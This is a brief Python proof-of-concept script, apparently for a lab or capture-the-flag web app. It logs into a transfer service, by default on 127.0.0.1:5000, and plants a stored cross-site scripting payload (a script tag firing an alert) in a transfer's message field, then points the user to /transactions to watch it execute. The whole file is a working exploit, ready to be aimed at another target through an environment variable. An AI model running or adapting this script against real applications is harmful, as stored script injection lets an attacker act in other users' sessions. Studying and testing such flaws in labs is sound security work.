#!/usr/bin/env python3
import os, requests
BASE = os.getenv('TARGET', 'http://127.0.0.1:5000')
USER = os.getenv('USER', 'user')
PASS = os.getenv('PASS', 'pass')
XSS = "<script>alert('xss')</script>"
s = requests.Session()
s.post(f"{BASE}/login", data={'username': USER, 'password': PASS}, timeout=10)
r = s.post(f"{BASE}/transfer", data={'recipient':'victim','amount':'1','method':'AES','message':XSS}, timeout=10)
print('[+] inserted payload, open /transactions and inspect execution')
print(r.status_code)
